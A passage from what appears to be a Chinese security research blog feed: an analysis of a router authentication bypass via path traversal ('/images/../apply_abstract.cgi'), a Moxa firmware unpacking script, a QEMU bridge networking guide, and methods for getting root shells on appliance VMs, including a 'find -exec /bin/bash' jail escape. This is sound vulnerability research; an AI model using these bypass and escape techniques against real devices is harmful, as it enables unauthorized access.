class="keyword">else</span></span><br><span class="line">        LOG(req, <span class="number">400</span>, <span class="string">&quot;Invalid or unsupported method.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先调用 url_decode 函数对 url 进行解码，然后调用 sub_DEB0 函数对 url 进行判断，关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_DEB0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> **i; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">  v2 = allow_urls[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !allow_urls[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = allow_urls; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(url, v2, v5) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = i[<span class="number">1</span>];</span><br><span class="line">    v2 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数从一个 allow_urls 列表中获取值，内容如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/images/</span><br><span class="line">/lang/</span><br><span class="line">/js/</span><br><span class="line">/css/</span><br><span class="line">/login.htm</span><br><span class="line">/loginpserr.htm</span><br><span class="line">/relogin.htm</span><br><span class="line">/login.cgi</span><br><span class="line">/cgi/cgi_tel_dect_firmware_upgrade_state.js</span><br><span class="line">/wz_setpwd.cgi</span><br><span class="line">/error_page.htm</span><br><span class="line">/cgi/cgi_clients.js</span><br><span class="line">/blocking.htm</span><br><span class="line">/get_ver.htm</span><br></pre></td></tr></table></figure></div>

<p>先获取 allow_urls  一项的长度，然后用 strncasecmp 函数和用户传入的 URL 比较，如果相等则返回 1，此时 req-&gt;is_url_valid 为 1。</p>
<p>之后回到 process_request 函数，判断 req-&gt;is_url_valid 的值，如果它等于 1，则不会执行 check_auth_0 函数，相当于当用户访问静态资源时，自动跳过身份验证。</p>
<p>随后判断 method，如果是 POST，则执行 process_post。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">process_post</span><span class="params">(struct_req *req)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *url; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  url = &amp;req-&gt;url;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s] path: %s, args: %s\n&quot;</span>, <span class="string">&quot;process_post&quot;</span>, &amp;req-&gt;url, req-&gt;args);</span><br><span class="line">  <span class="keyword">switch</span> ( sub_DF50(url) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">      LOG(req, <span class="number">302</span>, url);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !sub_14F9C(req) )</span><br><span class="line">        LOG(req, <span class="number">501</span>, <span class="string">&quot;POST to non-script&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      exec_cgi_script(req);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      LOG(req, <span class="number">400</span>, url);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>将 URL 传入 sub_DF50 函数，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_DF50</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  sub_167A8(url);</span><br><span class="line">  v2 = *url;</span><br><span class="line">  v3 = v2 == <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    v3 = v2 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">528</span>; i += <span class="number">66</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_17584((maybe_post_handlers + i)) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = maybe_post_handlers + i;</span><br><span class="line">    v6 = <span class="built_in">strlen</span>((maybe_post_handlers + i));</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(url, v5, v6) &amp;&amp; (*(v5 + v6 - <span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span> || v6 == <span class="built_in">strlen</span>(url) || url[v6] == <span class="string">&#x27;/&#x27;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_166D8(v6, url, (v5 + <span class="number">32</span>));</span><br><span class="line">      <span class="keyword">return</span> *(maybe_post_handlers + i + <span class="number">64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_166D8(<span class="number">0</span>, url, dword_61648);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再将 URL 传入 sub_167A8，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_167A8</span><span class="params">(<span class="type">int</span> url)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(url + k) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( double_dot[j] == *(url + k) )          <span class="comment">// 判断当前位置 url 字符是否为 .</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( double_dot[++j] )</span><br><span class="line">      &#123;</span><br><span class="line">        ++k;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (url + k + <span class="number">1</span>);                     <span class="comment">// 指向 .. 下一个字节</span></span><br><span class="line">        v4 = *v3;                               <span class="comment">// 获取字节</span></span><br><span class="line">        v5 = v4 == <span class="string">&#x27;/&#x27;</span>;                         <span class="comment">// 判断是否为 /</span></span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">          v5 = v4 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )                               <span class="comment">// 如果是</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( k &lt;= <span class="number">3</span> || *(url + k - <span class="number">2</span>) == <span class="string">&#x27;/&#x27;</span> )<span class="comment">// 如果 url 长度小于等于3，或者存在 /..</span></span><br><span class="line">          &#123;</span><br><span class="line">            v6 = k + <span class="number">1</span>;                         <span class="comment">// .. 下一个位置</span></span><br><span class="line">            k -= <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">if</span> ( k &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( ; k &amp;&amp; *(url + k) != <span class="string">&#x27;/&#x27;</span>; --k )<span class="comment">// 倒退，直到找到一个 /</span></span><br><span class="line">                ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              k = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v7 = url + k;                       <span class="comment">// 开头</span></span><br><span class="line">            v8 = *(url + v6);                   <span class="comment">// .. 下一个字节</span></span><br><span class="line">            *(url + k) = v8;                    <span class="comment">// 放到开头</span></span><br><span class="line">            <span class="keyword">if</span> ( v8 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                v9 = *++v3;                     <span class="comment">// 把后续字节拷贝到 url</span></span><br><span class="line">                *++v7 = v9;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v9 );</span><br><span class="line">              j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( j &lt;= <span class="number">0</span> )                          <span class="comment">// 如果不是 . （且没遇到过 .）就递增到 url 下一个字节</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      k += <span class="number">1</span> - j;</span><br><span class="line">      j = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单来讲，此函数会将形如 &#x2F;aaa&#x2F;..&#x2F;bbb 转换成 &#x2F;bbb。</p>
<p>转换之后，回到 sub_DF50 函数，将 URL 和 maybe_post_handlers 列表中定义的 handler 比较，如果比较成功，就回到 process_post 用 exec_cgi_script 执行对应的 handler 函数。</p>
<p>于是我们可以构造如 &#x2F;images&#x2F;..&#x2F;apply_abstract.cgi 类似的请求，程序先匹配到 &#x2F;images，绕过登录，然后替换 &#x2F;..&#x2F; 导致后续访问的是 &#x2F;apply_abstract.cgi 接口，实现身份验证绕过。</p>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   href="https://zh-cn.tenable.com/security/research/tra-2021-13?tns_redirect=true" >https://zh-cn.tenable.com/security/research/tra-2021-13?tns_redirect=true<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>身份验证绕过是一类影响比较严重的漏洞，通过此类漏洞可允许攻击者访问到后台更多敏感接口，通过组合利用漏洞可实现对设备的完全控制，从我们复现过的漏洞来看，身份验证绕过基本有以下几类</p>
<ol>
<li>设备的登录功能对于用户名&#x2F;密码处理不恰当，攻击者可通过传入空值&#x2F;硬编码值&#x2F;可本地计算的值来通过验证流程。</li>
<li>设备的会话管理存在问题，攻击者通过控制 Cookie 值绕过会话检查。</li>
<li>设备对于用户访问的资源路径处理不恰当，攻击者通过路径穿越&#x2F;插入特殊字符串等通过身份验证，但实际访问到敏感接口。</li>
<li>设备区分了 PC 和 app 请求，app 请求可能存在弱校验。</li>
<li>设备直接暴露了敏感接口，攻击者通过访问这些接口得到认证信息。</li>
</ol>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Moxa Nport 系列设备固件解包</title>
    <url>/2021/05/29/moxa-nport-unpack/</url>
    <content><![CDATA[<p>Moxa Nport 设备固件解包。</p>
<span id="more"></span>

<h2 id="固件格式"><a href="#固件格式" class="headerlink" title="固件格式"></a>固件格式</h2><p>前四个字节为 *FRM，用于识别固件。固件头部大小为 0x160，内部包括文件数量、代码段偏移量等数据结构，头部后面跟着的是文件表，每一个条目大小 0x40，包括文件名、文件偏移量、大小等信息。最后是代码段。</p>
<h2 id="解包脚本"><a href="#解包脚本" class="headerlink" title="解包脚本"></a>解包脚本</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: CataLpa</span></span><br><span class="line"><span class="comment"># Date: 2021-05-29</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filename, start_address, end_address, data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = <span class="built_in">open</span>(<span class="string">&quot;./unpacked/&quot;</span> + filename, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        i = start_address</span><br><span class="line">        temp_data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= end_address:</span><br><span class="line">            temp_data += data[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        t.write(temp_data)</span><br><span class="line">        t.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No unpacked folder.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> args.f:</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(args.f):</span><br><span class="line">            f = <span class="built_in">open</span>(args.f)</span><br><span class="line">            data = f.read()</span><br><span class="line">            f.close()</span><br><span class="line">            magic = data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">if</span> magic != <span class="string">&quot;*FRM&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Not a valid firmware file.&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">            header_length = <span class="number">0x160</span></span><br><span class="line">            code_offset = u32(data[<span class="number">0x54</span>:<span class="number">0x58</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Code offset: 0x%x&quot;</span> % code_offset)</span><br><span class="line">            table_length = u32(data[<span class="number">0xa2</span>:<span class="number">0xa4</span>].ljust(<span class="number">4</span>, <span class="string">&quot;\x00&quot;</span>))    <span class="comment"># Nport-5400</span></span><br><span class="line">            <span class="comment"># table_length = u32(data[0x9a:0x9c].ljust(4, &quot;\x00&quot;))  # Nport-5100</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] File: 0x%x&quot;</span> % table_length)</span><br><span class="line">            </span><br><span class="line">            i = header_length</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            filename = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; header_length + (table_length * <span class="number">0x40</span>):</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">                filename = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> j &lt; <span class="number">0x30</span>:</span><br><span class="line">                    <span class="keyword">if</span> data[j + i] != <span class="string">&#x27;\x00&#x27;</span>:</span><br><span class="line">                        filename += data[j + i]</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                j += <span class="number">8</span></span><br><span class="line">                length = u32(data[j + i] +  data[j + i + <span class="number">1</span>] + data[j + i + <span class="number">2</span>] + data[j + i + <span class="number">3</span>])</span><br><span class="line">                j += <span class="number">4</span></span><br><span class="line">                start_address = u32(data[j + i] +  data[j + i + <span class="number">1</span>] + data[j + i + <span class="number">2</span>] + data[j + i + <span class="number">3</span>])</span><br><span class="line">                i += <span class="number">0x40</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] Extracting &quot;</span> + filename + <span class="string">&quot; ...&quot;</span>)</span><br><span class="line">                extractFile(filename, start_address + <span class="number">0x60</span>, start_address + <span class="number">0x60</span> + length, data)</span><br><span class="line">            binary = <span class="built_in">open</span>(<span class="string">&quot;binary.bin&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">            binary.write(data[code_offset:])</span><br><span class="line">            binary.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] No such file.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Use -h to get help.&quot;</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>QEMU 网络配置一把梭</title>
    <url>/2021/05/28/QEMU-networking/</url>
    <content><![CDATA[<p>如何配置 QEMU 虚拟机网络。</p>
<span id="more"></span>

<h2 id="关于-QEMU-的网络策略"><a href="#关于-QEMU-的网络策略" class="headerlink" title="关于 QEMU 的网络策略"></a>关于 QEMU 的网络策略</h2><p>QEMU 提供 4 种网络通信方法，它们分别是：</p>
<ol>
<li>User mode stack：用户协议栈方式，这种方式的大概原理是在 QEMU 进程中实现一个协议栈，这个协议栈可以被视为一个主机与虚拟机之间的 NAT 服务器，它负责将 QEMU 所模拟的系统网络请求转发到外部网卡上面，从而实现网络通信。但是不能将外面的请求转发到虚拟机内部，并且虚拟机 VLAN 中的每个接口必须放在 10.0.2.0 子网中。</li>
<li>socket： 为 VLAN 创建套接字，并把多个 VLAN 连接起来。</li>
<li>TAP&#x2F;bridge：最重要的一种通信方式，我们想要实现 QEMU 虚拟机和外部通信就需要使用这种方式。</li>
<li>VDE：也是用于连接 VLAN 的，如果没有 VLAN 连接需求基本用不到。</li>
</ol>
<p>重点解释一下 tap 模式，TAP 属于 LInux 内核支持的一种虚拟化网络设备，还有 TUN 也属于这种设备，它们完全由软件模拟实现，TUN&#x2F;TAP 负责在内核协议栈和用户进程之间传送协议数据单元。TUN 工作在网络层，而 TAP 工作在数据链路层，TUN 负责与应用程序交换 IP 数据包，而 TAP 与应用程序交换以太网帧。所以 TUN 经常涉及路由，而 TAP 常用于网络桥接。</p>
<p>所谓桥接可以简单理解为在两张网卡之间搭一座桥，一端有数据就可以通过桥走到另一端，对于实现 QEMU 虚拟机通信正合适。桥接技术在 VMWARE 中非常常用，我们设置虚拟机网络的时候就能看见桥接选项，实际上 VMware 在物理机上虚拟化了 3 张网卡，分别负责桥接、仅主机、共享网络。</p>
<h2 id="具体的配置过程"><a href="#具体的配置过程" class="headerlink" title="具体的配置过程"></a>具体的配置过程</h2><p>（<strong>首先确定你的机器支持 TAP&#x2F;TUN 虚拟设备</strong>）</p>
<p>首先安装如下软件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils        # 虚拟网桥工具</span><br><span class="line">apt-get install uml-utilities       # UML（User-mode linux）工具</span><br></pre></td></tr></table></figure></div>

<p>添加网桥，大部分操作都需要 root 权限：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig &lt;你的网卡名称(能上网的那张)&gt; down    # 首先关闭宿主机网卡接口</span><br><span class="line">brctl addbr br0                     # 添加名为 br0 的网桥</span><br><span class="line">brctl addif br0 &lt;你的网卡名称&gt;        # 在 br0 中添加一个接口</span><br><span class="line">brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">ifconfig &lt;你的网卡名称&gt; 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">brctl showstp br0                   # 查看 br0 的各接口信息</span><br></pre></td></tr></table></figure></div>

<p>当配置完成之后执行 ifconfig 结果应该如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-2.png"
                     
                ></p>
<p>此时网桥已经得到了 IP，并且能够连接网络的网卡 enp0s5 也加入了网桥，此时我们的网桥状态大致是这种情况</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-3.png"
                     
                ></p>
<p>桥的一端连接到 enp0s5，我们只需要再把另一端接到 QEMU 虚拟机(准确的说是 VLAN )上面就可以了。</p>
<p>创建一个 TAP 设备，作为 QEMU 一端的接口：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">brctl showstp br0                   # 显示 br0 的各个接口</span><br></pre></td></tr></table></figure></div>

<p>此时网桥的信息应该是：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-4.png"
                     
                ></p>
<p>这样就相当于把两张网卡通过网桥连起来了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-5.png"
                     
                ></p>
<p>现在只需要启动镜像，指定网络连接模式是 TAP 即可。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure></div>

<p>特别说明一下参数含义：-net nic 表示希望 QEMU 在虚拟机中创建一张虚拟网卡，-net tap 表示连接类型为 TAP，并且指定了网卡接口名称(就是刚才创建的 tap0，相当于把虚拟机接入网桥)。</p>
<p>script 和 downscript 两个选项的作用是告诉 QEMU 在启动系统的时候是否调用脚本自动配置网络环境，如果这两个选项为空，那么 QEMU 启动和退出时会自动选择第一个不存在的 tap 接口(通常是 tap0)为参数，调用脚本 &#x2F;etc&#x2F;qemu-ifup 和 &#x2F;etc&#x2F;qemu-ifdown。由于我们已经配置完毕，所以这两个参数设置为 no 即可。</p>
<p>等到镜像 boot 完毕，在命令行中 ping 一下百度：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-6.png"
                     
                ></p>
<p>至此网络配置成功。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/u014022631/article/details/53411557" >https://blog.csdn.net/u014022631/article/details/53411557<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html" >https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>一些虚拟机获取 shell 的方法</title>
    <url>/2021/05/12/vm_shell/</url>
    <content><![CDATA[<p>前端时间碰到一些网络设备，它们可以以虚拟机形式进行安装部署，在分析此类设备的时候，获取一个 root shell 会更加方便，但是大部分设备镜像中都设置了自定义的 cli 作为 jail，防止用户直接访问到 linux sh，提高设备安全性。现总结一些获取虚拟机设备 root shell 的方法，分享给大家。</p>
<span id="more"></span>

<h2 id="shell-提权"><a href="#shell-提权" class="headerlink" title="shell 提权"></a>shell 提权</h2><p>某些设备没有内置自定义的 cli 程序，但是它们默认提供的 shell 权限较低，此时可以考虑通过某些历史漏洞进行提权，获取 root 权限，例如前段时间爆出的 sudo 堆溢出漏洞等，由于设备内核版本普遍不高，一般都可以成功提权。</p>
<h2 id="cli-自带的功能"><a href="#cli-自带的功能" class="headerlink" title="cli 自带的功能"></a>cli 自带的功能</h2><p>为了更方便的维护设备，cli jail 中可能会添加一些特殊的命令，通过执行这些命令就能获取 linux sh，以 Citrix Netscaler 为例，其 cli 提供了 shell 命令，直接执行就可以获取 linux shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-1.png"
                     
                ></p>
<p>另外例如 check point Gateway，可使用 set expert-password 设置专家模式密码，然后用 expert 命令进入专家模式，所谓专家模式就是 linux root shell。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-2.png"
                     
                ></p>
<p>所以遇到一款新设备应该先查看其 cli 命令手册，看看是否存在能够直接获取 root shell 的命令。</p>
<h2 id="利用历史漏洞获取-shell"><a href="#利用历史漏洞获取-shell" class="headerlink" title="利用历史漏洞获取 shell"></a>利用历史漏洞获取 shell</h2><p>通过查看历史 CVE 或官方漏洞通告信息，可以发现一些 cli jail 存在命令注入&#x2F;逃逸的问题，通过利用这些历史漏洞就能拿到 linux shell。</p>
<p><a class="link"   href="https://repo.zenk-security.com/Conferences/HITB/D2T1%20-%20Felix%20Wilhelm%20-%20Attacking%20Next%20Generation%20Firewalls.pdf" >参考资料<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="解包修改文件系统"><a href="#解包修改文件系统" class="headerlink" title="解包修改文件系统"></a>解包修改文件系统</h2><p>前提：磁盘文件没有加密</p>
<p>cli jail 背后对应着某个程序，通过解包文件系统，我们可以尝试修改这个 jail 程序或者直接在初始化脚本等位置添加代码，例如启动 telnet 或者反弹 shell 来实现逃逸。</p>
<p>需要注意的是系统可能对 file system 进行检测，如果发现文件被修改则拒绝启动，此时有两种解决方案。</p>
<ol>
<li>修改 vmtools 相关文件，位于 &#x2F;etc&#x2F;vmware-tools 目录下的 vmtools 脚本文件属于第三方代码，厂商可能不会对它们进行检查。</li>
<li>修改文件系统检测程序，这种方式需要对程序进行逆向分析，尝试定位具体的检查逻辑。</li>
</ol>
<h2 id="rbash-逃逸思路"><a href="#rbash-逃逸思路" class="headerlink" title="rbash 逃逸思路"></a>rbash 逃逸思路</h2><p>某些 cli jail 中可使用部分正常的 linux 命令，例如 find、more 等，方便用户操作，其中某些 linux 命令可用于逃逸，例如 find 的 exec 参数</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -exec /bin/bash \;</span><br></pre></td></tr></table></figure></div>

<p>more 的 subshell，在交互式界面使用感叹号执行命令</p>
